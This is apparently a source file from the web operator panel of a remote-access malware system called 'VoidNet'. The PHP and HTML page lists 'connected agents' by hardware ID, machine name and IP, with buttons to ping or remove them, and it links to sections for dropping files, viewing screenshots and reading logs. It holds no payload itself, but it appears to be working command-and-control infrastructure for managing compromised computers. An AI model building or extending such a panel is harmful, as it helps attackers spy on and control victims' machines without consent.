<?php
require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/db.php';
date_default_timezone_set('UTC');

// Handle client removal
if (isset($_GET['action']) && $_GET['action'] == 'remove' && isset($_GET['id'])) {
    $id_to_remove = (int)$_GET['id'];
    $stmt = $mysqli->prepare("DELETE FROM clients WHERE id = ?");
    $stmt->bind_param('i', $id_to_remove);
    $stmt->execute();
    header("Location: clients.php?message=removed");
    exit;
}

// Initial page load data
$result = $mysqli->query("SELECT id, client_hwid, machine_name, last_ip, last_seen FROM clients ORDER BY last_seen DESC");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Clients - VoidNet</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  body {
    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
    color: #e0e0e0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    min-height: 100vh;
  }
  .sidebar {
    background: linear-gradient(180deg, #242424 0%, #1e1e1e 100%);
    width: 250px;
    position: fixed;
    top: 0; left: 0; bottom: 0;
    padding: 0;
    border-right: 1px solid #3a3a3a;
    box-shadow: 2px 0 10px rgba(0,0,0,0.3);
  }
  .sidebar-header {
    padding: 25px 20px;
    border-bottom: 1px solid #3a3a3a;
    background: #1e1e1e;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .sidebar-header img {
    width: 32px;
    height: 32px;
    margin-right: 10px;
    filter: drop-shadow(0 0 5px rgba(255,255,255,0.1));
  }
  .sidebar-header h1 {
    color: #ffffff;
    font-size: 20px;
    font-weight: 600;
    text-shadow: 0 1px 2px rgba(0,0,0,0.5);
  }
  .sidebar-nav {
    padding: 20px 0;
  }
  .sidebar-nav a {
    display: flex;
    align-items: center;
    padding: 14px 20px;
    color: #ccc;
    text-decoration: none;
    transition: all 0.3s ease;
    border-left: 3px solid transparent;
    font-size: 14px;
    font-weight: 500;
  }
  .sidebar-nav a:hover {
    background: rgba(255,255,255,0.05);
    color: #ffffff;
    border-left-color: #666;
  }
  .sidebar-nav a.active {
    background: rgba(255,255,255,0.1);
    color: #ffffff;
    border-left-color: #888;
    font-weight: 600;
  }
  .sidebar-footer {
    position: absolute;
    bottom: 0;
    width: 100%;
    padding: 20px;
    border-top: 1px solid #3a3a3a;
    background: #1e1e1e;
    text-align: center;
  }
  .sidebar-footer a {
    color: #ff6b6b;
    text-decoration: none;
    font-weight: 600;
    padding: 10px;
    border-radius: 6px;
    display: inline-block;
    transition: all 0.3s ease;
    font-size: 14px;
  }
  .sidebar-footer a:hover {
    background: rgba(255,107,107,0.1);
    color: #ff8a8a;
  }
  .main-content {
    margin-left: 250px;
    padding: 30px;
    min-height: 100vh;
  }
  h1 {
    font-weight: 600;
    font-size: 28px;
    margin-bottom: 20px;
    color: #fff;
  }
  .panel {
    background: linear-gradient(135deg, #2a2a2a 0%, #1e1e1e 100%);
    border-radius: 10px;
    border: 1px solid #3a3a3a;
    box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    overflow: hidden;
  }
  .panel-header {
    background: linear-gradient(135deg, #1e1e1e 0%, #141414 100%);
    padding: 20px 25px;
    border-bottom: 1px solid #3a3a3a;
  }
  .panel-title {
    margin: 0;
    color: #ffffff;
    font-size: 18px;
    font-weight: 600;
  }
  .panel-body {
    padding: 0;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    color: #e0e0e0;
  }
  th, td {
    padding: 15px 25px;
    text-align: left;
    border-bottom: 1px solid #3a3a3a;
    font-size: 14px;
  }
  th {
    background: #1a1a1a;
    color: #ccc;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    font-size: 12px;
  }
  tr:hover {
    background: rgba(255,255,255,0.02);
  }
  tr:last-child td {
    border-bottom: none;
  }
  .status-indicator {
    display: inline-block;
    width: 12px;
    height: 12px;
    border-radius: 50%;
    margin-right: 10px;
    background-color: #666; /* default grey */
  }
  .status-indicator.online {
    background-color: #0f0;
  }
  .status-indicator.offline {
    background-color: #f00;
  }
  .ping-btn {
    background-color: #5c7ccc;
    color: #f1f3f8;
    padding: 8px 14px;
    font-size: 0.85rem;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: 600;
    transition: background-color 0.3s ease;
  }
  .ping-btn:disabled {
    background-color: #444;
    cursor: not-allowed;
  }
  .remove-btn {
    color: #ff6b6b;
    text-decoration: none;
    font-weight: 600;
    margin-left: 15px;
    transition: color 0.3s ease;
  }
  .remove-btn:hover {
    color: #ff8787;
  }
  @media (max-width: 768px) {
    .main-content {
      margin-left: 0;
      padding: 20px;
    }
    .sidebar {
      width: 100%;
      height: auto;
      position: relative;
      border-right: none;
      box-shadow: none;
    }
    .sidebar-header {
      justify-content: center;
      padding: 15px 0;
    }
    .sidebar-nav a {
      display: inline-block;
      padding: 10px 15px;
      border-left: none;
      font-size: 14px;
    }
    .sidebar-nav {
      padding: 10px 0;
      text-align: center;
    }
    .sidebar-footer {
      position: relative;
      padding: 15px 0;
      border-top: none;
    }
    table, th, td {
      font-size: 12px;
      padding: 10px 15px;
    }
  }
</style>
</head>
<body>
  <aside class="sidebar">
    <div class="sidebar-header">
      <img src="../assets/image/logo.png" alt="VoidNet Logo">
      <h1>VoidNet</h1>
    </div>
    <nav class="sidebar-nav">
      <a href="dashboard.php">Dashboard</a>
      <a href="clients.php" class="active">Clients</a>
      <a href="drop.php">Drop File</a>
      <a href="screenshots.php">Screenshots</a>
      <a href="logs.php">Logs</a>
    </nav>
    <div class="sidebar-footer">
      <a href="../logout.php">Log Out</a>
    </div>
  </aside>

  <main class="main-content">
    <h1>Clients</h1>
    <div class="panel">
      <div class="panel-header">
        <h2 class="panel-title">Connected Agents</h2>
      </div>
      <div class="panel-body">
        <table>
          <thead>
            <tr>
              <th>Status</th>
              <th>Machine Name</th>
              <th>Last IP</th>
              <th>Last Seen</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody id="clientsTableBody">
            <?php while($client = $result->fetch_assoc()): ?>
            <tr data-client-id="<?php echo $client['id']; ?>">
              <td>
                <span class="status-indicator"></span>
                <span class="status-text">Unknown</span>
              </td>
              <td><?php echo htmlspecialchars($client['machine_name']); ?></td>
              <td><?php echo htmlspecialchars($client['last_ip']); ?></td>
              <td><?php echo htmlspecialchars($client['last_seen']); ?></td>
              <td>
                <button class="ping-btn" data-id="<?php echo $client['id']; ?>">Ping</button>
                <a href="clients.php?action=remove&id=<?php echo $client['id']; ?>" class="remove-btn" onclick="return confirm('Are you sure you want to remove this client?');">Remove</a>
              </td>
            </tr>
            <?php endwhile; ?>
            <?php if ($result->num_rows === 0): ?>
            <tr><td colspan="5" style="text-align:center;">No clients have checked in yet.</td></tr>
            <?php endif; ?>
          </tbody>
        </table>
      </div>
    </div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      document.querySelectorAll('.ping-btn').forEach(button => {
        button.addEventListener('click', () => {
          const clientId = button.dataset.id;
          const row = button.closest('tr');
          const statusIndicator = row.querySelector('.status-indicator');
          const statusText = row.querySelector('.status-text');

          button.disabled = true;
          statusText.textContent = 'Pinging...';
          statusIndicator.className = 'status-indicator';

          const formData = new FormData();
          formData.append('id', clientId);

          fetch('../api/ping_client.php', { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
              if (data.status === 'ping_sent') {
                setTimeout(() => {
                  fetch('../api/check_ping.php', { method: 'POST', body: formData })
                    .then(res => res.json())
                    .then(pingResult => {
                      if (pingResult.status === 'online') {
                        statusText.textContent = 'Online';
                        statusIndicator.classList.add('online');
                      } else {
                        statusText.textContent = 'Offline';
                        statusIndicator.classList.add('offline');
                      }
                      button.disabled = false;
                    }).catch(() => {
                      statusText.textContent = 'Offline';
                      statusIndicator.classList.add('offline');
                      button.disabled = false;
                    });
                }, 10000); // 10 second timeout
              } else {
                statusText.textContent = 'Error';
                button.disabled = false;
              }
            }).catch(() => {
              statusText.textContent = 'Error';
              button.disabled = false;
            });
        });
      });
    });
  </script>
</body>
</html>
